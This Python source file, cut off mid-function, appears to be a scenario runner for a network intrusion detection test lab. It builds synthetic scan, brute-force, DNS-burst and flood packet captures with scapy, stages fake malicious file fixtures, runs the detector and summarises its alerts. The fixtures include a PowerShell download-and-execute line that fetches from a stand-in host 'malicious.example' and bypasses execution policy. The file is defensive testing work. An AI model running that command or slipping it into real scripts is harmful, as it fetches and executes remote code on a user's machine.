from __future__ import annotations

import argparse
import json
import os
import sqlite3
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import yaml
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, TCP, UDP
from scapy.packet import Raw
from scapy.utils import wrpcap


REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from src.NIDS.adversary import (
    get_ai_scenario_definition,
    get_scenario_taxonomy,
    list_ai_scenarios,
    write_taxonomy_bundle,
    write_robustness_matrix,
)

SCENARIOS_ROOT = REPO_ROOT / "NIDS_TestLab" / "scenarios"
RESULTS_ROOT = REPO_ROOT / "NIDS_TestLab" / "results"
REPORTS_ROOT = REPO_ROOT / "NIDS_TestLab" / "reports"


def _utc_now() -> datetime:
    return datetime.now(timezone.utc)


def _iso_now() -> str:
    return _utc_now().isoformat(timespec="seconds")


def _stamp_now() -> str:
    return _utc_now().strftime("%Y%m%d-%H%M%S")


def _default_python() -> Path:
    candidates = [
        REPO_ROOT / ".venv" / "Scripts" / "python.exe",
        REPO_ROOT / ".venv" / "bin" / "python",
    ]
    for path in candidates:
        if path.exists():
            return path
    return Path(sys.executable)


def _resolve_repo_path(raw_path: str | None) -> Path | None:
    token = str(raw_path or "").strip()
    if not token:
        return None
    path = Path(token)
    if path.is_absolute():
        return path
    return (REPO_ROOT / path).resolve()


def _safe_slug(value: str) -> str:
    token = "".join(ch.lower() if ch.isalnum() else "-" for ch in value.strip())
    while "--" in token:
        token = token.replace("--", "-")
    return token.strip("-") or "scenario"


def _read_yaml(path: Path) -> dict[str, Any]:
    with path.open("r", encoding="utf-8") as handle:
        payload = yaml.safe_load(handle) or {}
    if not isinstance(payload, dict):
        raise ValueError(f"Scenario file must be a YAML mapping: {path}")
    return payload


def _write_json(path: Path, payload: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2, ensure_ascii=True), encoding="utf-8")


def _write_text(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def _copy_text_file(source: Path, destination: Path) -> None:
    destination.parent.mkdir(parents=True, exist_ok=True)
    destination.write_text(source.read_text(encoding="utf-8"), encoding="utf-8")


def _write_yaml(path: Path, payload: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(yaml.safe_dump(payload, sort_keys=False), encoding="utf-8")


def _table_exists(conn: sqlite3.Connection, table_name: str) -> bool:
    row = conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table' AND name=?",
        (table_name,),
    ).fetchone()
    return row is not None


def _decode_json_list(raw: Any) -> list[str]:
    if isinstance(raw, list):
        return [str(item) for item in raw]
    if raw in (None, ""):
        return []
    try:
        payload = json.loads(str(raw))
        if isinstance(payload, list):
            return [str(item) for item in payload]
    except Exception:
        pass
    return [str(raw)]


def _set_packet_time(packet: Any, epoch: float) -> Any:
    packet.time = float(epoch)
    return packet


def _http_request_payload(
    *,
    method: str,
    uri: str,
    host: str,
    body: str = "",
    extra_headers: dict[str, str] | None = None,
) -> bytes:
    lines = [f"{method.upper()} {uri} HTTP/1.1", f"Host: {host}", "User-Agent: nids-lab-runner"]
    if extra_headers:
        for key, value in extra_headers.items():
            lines.append(f"{key}: {value}")
    payload = body.encode("utf-8")
    if payload:
        lines.append("Content-Type: application/x-www-form-urlencoded")
        lines.append(f"Content-Length: {len(payload)}")
    request = "\r\n".join(lines).encode("utf-8") + b"\r\n\r\n" + payload
    return request


def _packet_sequence(
    *,
    component: dict[str, Any],
    base_epoch: float,
) -> list[Any]:
    kind = str(component.get("kind") or "").strip().lower()
    src_ip = str(component.get("src_ip") or "10.77.0.20")
    dst_ip = str(component.get("dst_ip") or "10.77.0.30")
    start_sport = int(component.get("src_port_start", 40000))
    start_time_sec = float(component.get("start_time_sec", 0.0))
    interval_sec = max(0.0, float(component.get("interval_ms", 100)) / 1000.0)
    packets: list[Any] = []

    if kind == "tcp_scan":
        ports: list[int]
        if "ports" in component:
            ports = [int(item) for item in (component.get("ports") or [])]
        else:
            start_port = int(component.get("start_port", 1))
            count = int(component.get("count", 25))
            ports = list(range(start_port, start_port + count))
        ports.extend(int(item) for item in (component.get("extra_ports") or []))
        ordered_ports = []
        seen: set[int] = set()
        for port in ports:
            if port in seen:
                continue
            seen.add(port)
            ordered_ports.append(port)

        for index, dport in enumerate(ordered_ports):
            packet = IP(src=src_ip, dst=dst_ip) / TCP(
                sport=start_sport + index,
                dport=int(dport),
                flags=str(component.get("flags") or "S"),
            )
            packets.append(_set_packet_time(packet, base_epoch + start_time_sec + (index * interval_sec)))
        return packets

    if kind == "http_login_bruteforce":
        attempts = int(component.get("count", 8))
        port = int(component.get("dst_port", 8080))
        uri = str(component.get("uri") or "/login")
        host = str(component.get("host") or "app.internal")
        for index in range(attempts):
            body = f"username=alice&password=bad{index}"
            payload = _http_request_payload(method="POST", uri=uri, host=host, body=body)
            packet = IP(src=src_ip, dst=dst_ip) / TCP(
                sport=start_sport + index,
                dport=port,
                flags="PA",
            ) / Raw(load=payload)
            packets.append(_set_packet_time(packet, base_epoch + start_time_sec + (index * interval_sec)))
        return packets

    if kind == "http_keyword":
        requests = int(component.get("count", 4))
        port = int(component.get("dst_port", 8080))
        uri = str(component.get("uri") or "/shell?cmd.exe=whoami&tool=powershell")
        host = str(component.get("host") or "app.internal")
        method = str(component.get("method") or "GET").upper()
        body = str(component.get("body") or "")
        for index in range(requests):
            request_uri = uri.replace("{index}", str(index))
            request_body = body.replace("{index}", str(index))
            payload = _http_request_payload(method=method, uri=request_uri, host=host, body=request_body)
            packet = IP(src=src_ip, dst=dst_ip) / TCP(
                sport=start_sport + index,
                dport=port,
                flags="PA",
            ) / Raw(load=payload)
            packets.append(_set_packet_time(packet, base_epoch + start_time_sec + (index * interval_sec)))
        return packets

    if kind == "dns_burst":
        count = int(component.get("count", 36))
        port = int(component.get("dst_port", 53))
        domain = str(component.get("domain") or "dga-test.example")
        for index in range(count):
            label = f"{index:03d}" if bool(component.get("unique", True)) else "baseline"
            qname = f"{label}.{domain}"
            packet = IP(src=src_ip, dst=dst_ip) / UDP(
                sport=start_sport + index,
                dport=port,
            ) / DNS(
                rd=1,
                qd=DNSQR(qname=qname),
            )
            packets.append(_set_packet_time(packet, base_epoch + start_time_sec + (index * interval_sec)))
        return packets

    if kind == "benign_dns":
        count = int(component.get("count", 5))
        port = int(component.get("dst_port", 53))
        qname = str(component.get("qname") or "www.example.org")
        for index in range(count):
            packet = IP(src=src_ip, dst=dst_ip) / UDP(
                sport=start_sport + index,
                dport=port,
            ) / DNS(
                rd=1,
                qd=DNSQR(qname=qname),
            )
            packets.append(_set_packet_time(packet, base_epoch + start_time_sec + (index * interval_sec)))
        return packets

    if kind == "udp_flood":
        count = int(component.get("count", 260))
        port = int(component.get("dst_port", 9999))
        payload_size = max(1, int(component.get("payload_size", 256)))
        payload = b"U" * payload_size
        for index in range(count):
            packet = IP(src=src_ip, dst=dst_ip) / UDP(
                sport=start_sport + index,
                dport=port,
            ) / Raw(load=payload)
            packets.append(_set_packet_time(packet, base_epoch + start_time_sec + (index * interval_sec)))
        return packets

    if kind == "benign_http_get":
        count = int(component.get("count", 4))
        port = int(component.get("dst_port", 8080))
        uri = str(component.get("uri") or "/")
        host = str(component.get("host") or "portal.internal")
        for index in range(count):
            payload = _http_request_payload(method="GET", uri=uri, host=host)
            packet = IP(src=src_ip, dst=dst_ip) / TCP(
                sport=start_sport + index,
                dport=port,
                flags="PA",
            ) / Raw(load=payload)
            packets.append(_set_packet_time(packet, base_epoch + start_time_sec + (index * interval_sec)))
        return packets

    raise ValueError(f"Unsupported network component kind: {kind}")


def _artifact_fixture_content(kind: str, filename: str) -> bytes | str:
    if kind == "html_phishing":
        return (
            "<html><body>"
            "<script>console.log('1')</script>"
            "<script>console.log('2')</script>"
            "<script>console.log('3')</script>"
            "<script>console.log('4')</script>"
            "<a href='https://pastebin.com/raw/fixture'>reset</a>"
            "<h1>Mailbox upgrade</h1>"
            "</body></html>"
        )
    if kind == "powershell_loader":
        return (
            "powershell -NoProfile -ExecutionPolicy Bypass "
            "IEX (New-Object Net.WebClient).DownloadString('https://malicious.example/stage')\n"
        )
    if kind == "json_secret_dump":
        return json.dumps({"api_key": "test-only", "password": "unsafe-demo-value"}, indent=2)
    if kind == "benign_csv":
        return "hostname,owner\nsrv-01,ops\nsrv-02,finance\n"
    if kind == "exe_stub":
        return b"MZ-stub powershell http://malicious.example cmd.exe"
    if kind == "python_dropper":
        return "import os\nimport subprocess\nos.system('whoami')\nsubprocess.run(['ipconfig'])\n"
    raise ValueError(f"Unsupported artifact fixture kind: {kind} ({filename})")


def _stage_artifacts(artifact_specs: list[dict[str, Any]], incoming_dir: Path) -> list[Path]:
    staged: list[Path] = []
    incoming_dir.mkdir(parents=True, exist_ok=True)
    for spec in artifact_specs:
        filename = str(spec.get("filename") or "").strip()
        if not filename:
            raise ValueError("Artifact fixture requires filename")
        kind = str(spec.get("kind") or "").strip().lower()
        destination = incoming_dir / filename
        content = _artifact_fixture_content(kind, filename)
        if isinstance(content, bytes):
            destination.write_bytes(content)
        else:
            destination.write_text(content, encoding="utf-8")
        staged.append(destination)
    return staged


def _scenario_run_name(definition: dict[str, Any], run_prefix: str) -> str:
    slug = _safe_slug(str(definition.get("slug") or definition.get("scenario_id") or definition.get("name") or "scenario"))
    prefix = _safe_slug(run_prefix) if run_prefix.strip() else ""
    stamp = _stamp_now()
    return f"{prefix}-{slug}-{stamp}" if prefix else f"{slug}-{stamp}"


def platform_summary() -> dict[str, str]:
    return {
        "os": os.name,
        "platform": sys.platform,
        "python": sys.version.split()[0],
    }


def _scenario_environment(definition: dict[str, Any]) -> dict[str, Any]:
    environment = dict(definition.get("environment") or {})
    planned_modes = list(environment.get("planned_modes") or [])
    blocked_modes: list[dict[str, Any]] = []
    for item in planned_modes:
        mode = str(item.get("mode") or "").strip()
        if not mode or mode == "offline_replay":
            continue
        blocked_modes.append(
            {
                "mode": mode,
                "status": "blocked",
                "reason": str(item.get("reason") or "Not executed in the current host environment."),
                "prerequisites": list(item.get("prerequisites") or []),
            }
        )
    return {
        "primary_mode": str(environment.get("primary_mode") or "offline_replay"),
        "planned_modes": planned_modes,
        "blocked_modes": blocked_modes,
        "host_platform": platform_summary(),
    }


def _command_environment() -> dict[str, str]:
    env = os.environ.copy()
    repo_token = str(REPO_ROOT)
    current = env.get("PYTHONPATH", "")
    env["PYTHONPATH"] = repo_token if not current else f"{repo_token}{os.pathsep}{current}"
    return env


def _run_command(
    *,
    args: list[str],
    log_path: Path,
    cwd: Path = REPO_ROOT,
    required: bool = True,
) -> dict[str, Any]:
    started = _iso_now()
    start_perf = time.perf_counter()
    result = subprocess.run(
        args,
        cwd=str(cwd),
        env=_command_environment(),
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="ignore",
        check=False,
    )
    duration_sec = round(time.perf_counter() - start_perf, 3)
    log_lines = [
        f"started_at: {started}",
        f"duration_sec: {duration_sec}",
        f"exit_code: {result.returncode}",
        f"command: {' '.join(args)}",
        "",
        "STDOUT",
        "------",
        result.stdout,
        "",
        "STDERR",
        "------",
        result.stderr,
    ]
    _write_text(log_path, "\n".join(log_lines).rstrip() + "\n")
    return {
        "command": args,
        "exit_code": int(result.returncode),
        "required": bool(required),
        "started_at": started,
        "duration_sec": duration_sec,
        "log_path": str(log_path.resolve()),
    }


def _summarize_database(db_path: Path) -> dict[str, Any]:
    summary: dict[str, Any] = {
        "db_path": str(db_path.resolve()),
        "exists": db_path.exists(),
        "counts": {
            "flows": 0,
            "alerts": 0,
            "metrics": 0,
            "artifacts": 0,
        },
        "rule_counts": {},
        "engine_counts": {},
        "severity_counts": {},
        "detections": {
            "signature_triggered": False,
            "anomaly_triggered": False,
            "ml_triggered": False,
            "fusion_triggered": False,
            "suppression_changed_output": False,
        },
        "metrics": {
            "peak_queue_size": 0.0,
            "peak_events_per_sec": 0.0,
            "peak_alerts_per_min": 0.0,
        },
        "latest_alerts": [],
        "artifacts": {
            "risk_counts": {},
            "quarantined": [],
            "latest_records": [],
        },
    }
    if not db_path.exists():
        return summary

    conn = sqlite3.connect(str(db_path))
    conn.row_factory = sqlite3.Row
    try:
        if _table_exists(conn, "flows"):
            summary["counts"]["flows"] = int(conn.execute("SELECT COUNT(*) FROM flows").fetchone()[0])
        if _table_exists(conn, "alerts"):
            summary["counts"]["alerts"] = int(conn.execute("SELECT COUNT(*) FROM alerts").fetchone()[0])
            summary["rule_counts"] = {
                str(row[0]): int(row[1])
                for row in conn.execute(
                    "SELECT COALESCE(rule_name, ''), COUNT(*) FROM alerts GROUP BY COALESCE(rule_name, '')"
                ).fetchall()
                if str(row[0]).strip()
            }
            summary["engine_counts"] = {
                str(row[0]): int(row[1])
                for row in conn.execute(
                    "SELECT COALESCE(engine, ''), COUNT(*) FROM alerts GROUP BY COALESCE(engine, '')"
                ).fetchall()
                if str(row[0]).strip()
            }
            summary["severity_counts"] = {
                str(row[0]): int(row[1])
                for row in conn.execute(
                    "SELECT COALESCE(severity, ''), COUNT(*) FROM alerts GROUP BY COALESCE(severity, '')"
                ).fetchall()
                if str(row[0]).strip()
            }
            summary["detections"] = {
                "signature_triggered": int(summary["engine_counts"].get("signature", 0)) > 0,
                "anomaly_triggered": int(summary["engine_counts"].get("anomaly", 0)) > 0,
                "ml_triggered": int(summary["engine_counts"].get("ml", 0)) > 0,
                "fusion_triggered": int(summary["engine_counts"].get("fusion", 0)) > 0,
                "suppression_changed_output": bool(
                    conn.execute("SELECT COUNT(*) FROM alerts WHERE COALESCE(is_suppressed, 0) != 0").fetchone()[0]
                ),
            }
            summary["latest_alerts"] = [
                {
                    "timestamp": str(row["timestamp"] or ""),
                    "severity": str(row["severity"] or ""),
                    "engine": str(row["engine"] or ""),
                    "rule_name": str(row["rule_name"] or ""),
                    "summary": str(row["summary"] or ""),
                }
                for row in conn.execute(
                    """
                    SELECT timestamp, severity, engine, rule_name, summary
                    FROM alerts
                    ORDER BY id DESC
                    LIMIT 25
                    """
                ).fetchall()
            ]
        if _table_exists(conn, "metrics"):
            summary["counts"]["metrics"] = int(conn.execute("SELECT COUNT(*) FROM metrics").fetchone()[0])
            metric_map = {
                "peak_queue_size": "queue_size",
                "peak_events_per_sec": "events_per_sec",
                "peak_alerts_per_min": "alerts_per_min",
            }
            for output_key, metric_name in metric_map.items():
                row = conn.execute(
                    "SELECT COALESCE(MAX(metric_value), 0) FROM metrics WHERE metric_name = ?",
                    (metric_name,),
                ).fetchone()
                summary["metrics"][output_key] = float(row[0] or 0.0)
        if _table_exists(conn, "artifacts"):
            summary["counts"]["artifacts"] = int(conn.execute("SELECT COUNT(*) FROM artifacts").fetchone()[0])
            summary["artifacts"]["risk_counts"] = {
                str(row[0]): int(row[1])
                for row in conn.execute(
                    "SELECT COALESCE(risk_level, ''), COUNT(*) FROM artifacts GROUP BY COALESCE(risk_level, '')"
                ).fetchall()
                if str(row[0]).strip()
            }
            summary["artifacts"]["quarantined"] = [
                str(row[0])
                for row in conn.execute(
                    """
                    SELECT filename
                    FROM artifacts
                    WHERE LOWER(COALESCE(stored_path, '')) LIKE '%quarantine%'
                    ORDER BY id DESC
                    LIMIT 50
                    """
                ).fetchall()
                if str(row[0]).strip()
            ]
            summary["artifacts"]["latest_records"] = [
                {
                    "filename": str(row["filename"] or ""),
                    "risk_level": str(row["risk_level"] or ""),
                    "stored_path": str(row["stored_path"] or ""),
                    "reasons": _decode_json_list(row["reasons"]),
                }
                for row in conn.execute(
                    """
                    SELECT filename, risk_level, stored_path, reasons
                    FROM artifacts
                    ORDER BY id DESC
                    LIMIT 25
                    """
                ).fetchall()
            ]
    finally:
        conn.close()
    return summary


def _evaluate_verdict(definition: dict[str, Any], db_summary: dict[str, Any], commands: list[dict[str, Any]]) -> dict[str, Any]:
    expected = dict(definition.get("expected") or {})
    required_rules = [str(item) for item in (expected.get("required_rules") or [])]
    missing_rules = [rule for rule in required_rules if int(db_summary["rule_counts"].get(rule, 0)) <= 0]
    max_alerts = expected.get("max_alerts")

    artifact_expectations = dict(expected.get("artifacts") or {})
    artifact_counts = dict(db_summary.get("artifacts", {}).get("risk_counts", {}) or {})
    min_quarantined = int(artifact_expectations.get("min_quarantined", 0))
    min_high_risk = int(artifact_expectations.get("min_high_risk", 0))
    actual_quarantined = len(db_summary.get("artifacts", {}).get("quarantined", []) or [])
    actual_high_risk = int(artifact_counts.get("high", 0))

    required_command_failures = [item for item in commands if item.get("required") and int(item.get("exit_code", 1)) != 0]
    issues: list[str] = []
    if required_command_failures:
        issues.extend(f"required_step_failed:{Path(str(item['log_path'])).stem}" for item in required_command_failures)
    if missing_rules:
        issues.extend(f"missing_rule:{rule}" for rule in missing_rules)
    if max_alerts is not None and int(db_summary["counts"]["alerts"]) > int(max_alerts):
        issues.append(f"alerts_above_expected:{db_summary['counts']['alerts']}>{int(max_alerts)}")
    if min_quarantined and actual_quarantined < min_quarantined:
        issues.append(f"quarantined_count_below_expected:{actual_quarantined}<{min_quarantined}")
    if min_high_risk and actual_high_risk < min_high_risk:
        issues.append(f"high_risk_count_below_expected:{actual_high_risk}<{min_high_risk}")

    if required_command_failures:
        status = "fail"
    elif issues:
        status = "partial"
    else:
        status = "pass"

    return {
        "status": status,
        "issues": issues,
        "missing_rules": missing_rules,
        "max_alerts": int(max_alerts) if max_alerts is not None else None,
        "artifact_expectations": {
            "min_quarantined": min_quarantined,
            "min_high_risk": min_high_risk,
        },
        "artifact_actuals": {
            "quarantined": actual_quarantined,
            "high_risk": actual_high_risk,
        },
    }


def _summary_markdown(
    *,
    definition: dict[str, Any],
    run_name: str,
    result_dir: Path,
    db_summary: dict[str, Any],
    verdict: dict[str, Any],
    environment: dict[str, Any],
    commands: list[dict[str, Any]],
) -> str:
    expected = dict(definition.get("expected") or {})
    max_alerts = expected.get("max_alerts")
    max_alerts_token = f"`{int(max_alerts)}`" if max_alerts is not None else "not set"
    lines = [
        f"# {definition.get('name', run_name)}",
        "",
        f"- Scenario ID: `{definition.get('scenario_id', 'unknown')}`",
        f"- Run name: `{run_name}`",
        f"- Primary environment: `{environment.get('primary_mode', 'offline_replay')}`",
        f"- Status: `{verdict['status']}`",
        f"- Result directory: `{result_dir}`",
        "",
        "## Objective",
        "",
        str(definition.get("objective") or definition.get("description") or "No objective recorded."),
        "",
        "## Expected Outcome",
        "",
        f"- Required rules: {', '.join(f'`{item}`' for item in (expected.get('required_rules') or [])) or 'none'}",
        f"- Expected engines: {', '.join(f'`{item}`' for item in (expected.get('expected_engines') or [])) or 'observe only'}",
        f"- Expected fusion behavior: {str(expected.get('fusion_behavior') or 'Not specified')}",
        f"- Expected alert ceiling: {max_alerts_token}",
        "",
        "## Actual Outcome",
        "",
        f"- Flows: `{db_summary['counts']['flows']}`",
        f"- Alerts: `{db_summary['counts']['alerts']}`",
        f"- Metrics rows: `{db_summary['counts']['metrics']}`",
        f"- Artifact rows: `{db_summary['counts']['artifacts']}`",
        f"- Signature triggered: `{db_summary['detections']['signature_triggered']}`",
        f"- Anomaly triggered: `{db_summary['detections']['anomaly_triggered']}`",
        f"- ML triggered: `{db_summary['detections']['ml_triggered']}`",
        f"- Fusion triggered: `{db_summary['detections']['fusion_triggered']}`",
        f"- Suppression changed output: `{db_summary['detections']['suppression_changed_output']}`",
        "",
        "## Rule Counts",
        "",
    ]
    if db_summary["rule_counts"]:
        lines.extend(["| Rule | Count |", "|---|---:|"])
        for rule_name in sorted(db_summary["rule_counts"]):
            lines.append(f"| `{rule_name}` | {db_summary['rule_counts'][rule_name]} |")
    else:
        lines.append("- none")
    lines.extend(["", "## Evidence", ""])
    evidence_files = [
        result_dir / "manifest.json",
        result_dir / "metrics.json",
        result_dir / "robustness_summary.md",
        result_dir / "taxonomy_map.json",
        result_dir / "taxonomy_summary.md",
        result_dir / "alerts_extract.json",
        result_dir / "artifacts_extract.json",
        result_dir / "serious_test_report.md",
        result_dir / "threshold_tuning.md",
        result_dir / "artifacts_report.md",
        result_dir / "inputs" / "artifacts" / "processed",
        result_dir / "inputs" / "artifacts" / "quarantine",
    ]
    for path in evidence_files:
        if path.exists():
            lines.append(f"- `{path}`")
    lines.extend(["", "## Commands", ""])
    for command in commands:
        step = Path(str(command["log_path"])).stem
        lines.append(
            f"- `{step}` exit=`{command['exit_code']}` duration=`{command['duration_sec']}`s log=`{command['log_path']}`"
        )

    if environment.get("blocked_modes"):
        lines.extend(["", "## Blocked Extensions", ""])
        for item in environment["blocked_modes"]:
            lines.append(f"- `{item['mode']}`: {item['reason']}")
    if verdict.get("issues"):
        lines.extend(["", "## Issues", ""])
        for issue in verdict["issues"]:
            lines.append(f"- {issue}")
    return "\n".join(lines) + "\n"


def load_scenario_definition(path: Path) -> dict[str, Any]:
    definition = _read_yaml(path)
    definition.setdefault("scenario_id", path.stem.upper())
    definition.setdefault("name", path.stem)
    definition.setdefault("slug", _safe_slug(path.stem))
    definition.setdefault("objective", definition.get("description") or "Scenario objective not documented.")
    return definition


def _write_ground_truth(path: Path, expected: dict[str, Any]) -> Path | None:
    ground_truth = dict(expected.get("ground_truth") or {})
    expected_detections = list(ground_truth.get("expected_detections") or [])
    expected_misses = [str(item) for item in (ground_truth.get("expected_misses") or []) if str(item).strip()]
    if not expected_detections and not expected_misses:
        return None
    payload = {
        "schema_version": 1,
        "expected_detections": expected_detections,
        "expected_misses": expected_misses,
    }
    _write_json(path, payload)
    return path


def _load_metrics_payload(path: Path) -> dict[str, Any] | None:
    if not path.exists():
        return None
    try:
        payload = json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return None
    return payload if isinstance(payload, dict) else None


def _robustness_summary_markdown(
    *,
    definition: dict[str, Any],
    db_summary: dict[str, Any],
    metrics_payload: dict[str, Any] | None,
    result_dir: Path,
) -> str:
    expected = dict(definition.get("expected") or {})
    weakness_tested = str(expected.get("weakness_tested") or "Not specified.")
    expected_misses = [
        str(item) for item in (((expected.get("ground_truth") or {}).get("expected_misses") or [])) if str(item).strip()
    ]
    lines = [
        f"# Robustness Summary: {definition.get('name', definition.get('slug', 'scenario'))}",
        "",
        f"- Scenario ID: `{definition.get('scenario_id', 'unknown')}`",
        f"- Weakness tested: {weakness_tested}",
        f"- Result directory: `{result_dir}`",
        f"- Total alerts observed: `{db_summary['counts']['alerts']}`",
        "",
        "## Replay Outcome",
        "",
        f"- Signature triggered: `{db_summary['detections']['signature_triggered']}`",
        f"- Anomaly triggered: `{db_summary['detections']['anomaly_triggered']}`",
        f"- ML triggered: `{db_summary['detections']['ml_triggered']}`",
        f"- Fusion triggered: `{db_summary['detections']['fusion_triggered']}`",
    ]
    max_alerts = expected.get("max_alerts")
    if max_alerts is not None:
        lines.append(f"- Expected alert ceiling: `{int(max_alerts)}`")
    if expected_misses:
        lines.extend(["", "## Expected Misses", ""])
        for item in expected_misses:
            lines.append(f"- `{item}`")
    if metrics_payload is not None:
        totals = dict(metrics_payload.get("totals") or {})
        metrics = dict(metrics_payload.get("metrics") or {})
        lines.extend(
            [
                "",
                "## Evaluation Metrics",
                "",
                f"- TP: `{totals.get('tp', 0)}`",
                f"- FP: `{totals.get('fp', 0)}`",
                f"- FN: `{totals.get('fn', 0)}`",
                f"- Precision: `{metrics.get('precision', 0.0)}`",
                f"- Recall: `{metrics.get('recall', 0.0)}`",
                f"- F1-score: `{metrics.get('f1', 0.0)}`",
            ]
        )
    else:
        lines.extend(["", "## Evaluation Metrics", "", "- Ground truth was not provided for this scenario run."])
    lines.extend(["", "## Rule Counts", ""])
    if db_summary["rule_counts"]:
        lines.extend(["| Rule | Count |", "|---|---:|"])
        for rule_name in sorted(db_summary["rule_counts"]):
            lines.append(f"| `{rule_name}` | {db_summary['rule_counts'][rule_name]} |")
    else:
        lines.append("- none")
    lines.append("")
    return "\n".join(lines)


def resolve_scenarios(scenarios_dir: Path, requested: list[str]) -> list[tuple[Path | None, dict[str, Any]]]:
    if not scenarios_dir.exists():
        raise FileNotFoundError(f"Scenarios directory not found: {scenarios_dir}")

    available = {path.stem: path for path in sorted(scenarios_dir.glob("*.yml"))}
    normalized_requested = requested or ["all"]
    resolved: list[tuple[Path | None, dict[str, Any]]] = []

    for item in normalized_requested:
        if item == "all":
            for path in available.values():
                resolved.append((path, load_scenario_definition(path)))
            continue
        if item == "all-ai":
            for name in list_ai_scenarios():
                resolved.append((None, get_ai_scenario_definition(name)))
            continue
        if item in list_ai_scenarios():
            resolved.append((None, get_ai_scenario_definition(item)))
            continue
        raw = Path(item)
        if raw.exists():
            scenario_path = raw.resolve()
            resolved.append((scenario_path, load_scenario_definition(scenario_path)))
            continue
        if item in available:
            scenario_path = available[item]
            resolved.append((scenario_path, load_scenario_definition(scenario_path)))
            continue
        raise FileNotFoundError(f"Unknown scenario: {item}")
    return resolved


def run_scenario(
    definition: dict[str, Any],
    *,
    scenario_path: Path | None,
    results_root: Path,
    python_path: Path,
    run_prefix: str,
    skip_visualize: bool,
    dry_run: bool,
) -> dict[str, Any]:
    run_name = _scenario_run_name(definition, run_prefix=run_prefix)
    result_dir = results_root / run_name
    logs_dir = result_dir / "logs"
    inputs_dir = result_dir / "inputs"
    visual_dir = result_dir / "visual_export"
    artifact_root = inputs_dir / "artifacts"
    artifact_incoming_dir = artifact_root / "incoming"
    artifact_processed_dir = artifact_root / "processed"
    artifact_quarantine_dir = artifact_root / "quarantine"
    logs_dir.mkdir(parents=True, exist_ok=True)
    inputs_dir.mkdir(parents=True, exist_ok=True)

    environment = _scenario_environment(definition)
    runtime_cfg = dict(definition.get("runtime") or {})
    expected = dict(definition.get("expected") or {})
    base_epoch = _utc_now().timestamp()

    commands: list[dict[str, Any]] = []
    scenario_bundle_path = result_dir / "scenario.yml"
    if scenario_path is not None:
        _copy_text_file(scenario_path, scenario_bundle_path)
    else:
        _write_yaml(result_dir / "scenario.generated.yml", definition)
        _write_yaml(scenario_bundle_path, definition)

    config_path = _resolve_repo_path(str(runtime_cfg.get("config") or "NIDS_TestLab/config/offline_replay_profile.yml"))
    if config_path is None or not config_path.exists():
        raise FileNotFoundError(f"Runtime config not found: {config_path}")
    _copy_text_file(config_path, result_dir / "runtime_config.yml")

    pcap_path: Path | None = None
    network_components = list((definition.get("network") or {}).get("components") or [])
    if network_components:
        packets: list[Any] = []
        for component in network_components:
            packets.extend(_packet_sequence(component=component, base_epoch=base_epoch))
        packets.sort(key=lambda packet: float(getattr(packet, "time", 0.0)))
        pcap_path = inputs_dir / f"{_safe_slug(str(definition.get('slug') or run_name))}.pcap"
        wrpcap(str(pcap_path), packets)

    artifact_specs = list((definition.get("artifacts") or {}).get("fixtures") or [])
    if artifact_specs:
        _stage_artifacts(artifact_specs, artifact_incoming_dir)

    taxonomy_json_path, taxonomy_md_path = write_taxonomy_bundle(
        definition=definition,
        out_json=result_dir / "taxonomy_map.json",
        out_md=result_dir / "taxonomy_summary.md",
    )
    taxonomy_payload = get_scenario_taxonomy(definition)
    ground_truth_path = _write_ground_truth(result_dir / "ground_truth.json", expected)

    if not dry_run:
        if pcap_path is not None:
            runtime_args = [
                str(python_path),
                "-m",
                "nids",
                "run-local",
                "--pcap-dir",
                str(pcap_path),
                "--output-dir",
                str(result_dir),
                "--config",
                str(config_path),
                "--rules",
                str(_resolve_repo_path(str(runtime_cfg.get("rules") or "rules/rules.yml"))),
                "--sensor-id",
                str(runtime_cfg.get("sensor_id") or "nids-phase3-offline"),
                "--replay-delay-ms",
                str(int(runtime_cfg.get("replay_delay_ms", 0))),
                "--metrics-interval",
                str(int(runtime_cfg.get("metrics_interval", 1))),
                "--report-out",
                str(result_dir / "serious_test_report.md"),
                "--visual-out",
                str(visual_dir),
            ]
            if bool(runtime_cfg.get("use_model", True)):
                model_path = _resolve_repo_path(str(runtime_cfg.get("model_path") or "models/model.pkl"))
                if model_path is None or not model_path.exists():
                    raise FileNotFoundError(f"Model path not found: {model_path}")
                runtime_args.extend(["--model", str(model_path)])
            if bool(runtime_cfg.get("enable_unsupervised", True)):
                runtime_args.append("--unsupervised")
            if ground_truth_path is not None:
                runtime_args.extend(["--ground-truth", str(ground_truth_path)])
            commands.append(
                _run_command(
                    args=runtime_args,
                    log_path=logs_dir / "runtime.log",
                )
            )
            db_path = result_dir / "nids.db"
            if db_path.exists():
                commands.append(
                    _run_command(
                        args=[
                            str(python_path),
                            "-m",
                            "nids",
                            "report",
                            "--from-db",
                            str(db_path),
                            "--out",
                            str(result_dir / "serious_test_report.md"),
                        ],
                        log_path=logs_dir / "incident_report.log",
                    )
                )
                commands.append(
                    _run_command(
                        args=[
                            str(python_path),
                            "-m",
                            "nids",
                            "threshold-report",
                            "--from-db",
                            str(db_path),
                            "--out-json",
                            str(result_dir / "threshold_tuning.json"),
                            "--out-md",
                            str(result_dir / "threshold_tuning.md"),
                            "--lookback-days",
                            str(int(runtime_cfg.get("threshold_lookback_days", 3650))),
                        ],
                        log_path=logs_dir / "threshold_report.log",
                    )
                )
        if artifact_specs:
            db_path = result_dir / "nids.db"
            commands.append(
                _run_command(
                    args=[
                        str(python_path),
                        "-m",
                        "nids",
                        "artifact-scan",
                        "--path",
                        str(artifact_incoming_dir),
                        "--recursive",
                        "--db",
                        str(db_path),
                        "--jsonl",
                        str(result_dir / "artifacts.jsonl"),
                        "--processed-dir",
                        str(artifact_processed_dir),
                        "--quarantine-dir",
                        str(artifact_quarantine_dir),
                    ],
                    log_path=logs_dir / "artifact_scan.log",
                )
            )
            commands.append(
                _run_command(
                    args=[
                        str(python_path),
                        "-m",
                        "nids",
                        "artifact-report",
                        "--from-db",
                        str(db_path),
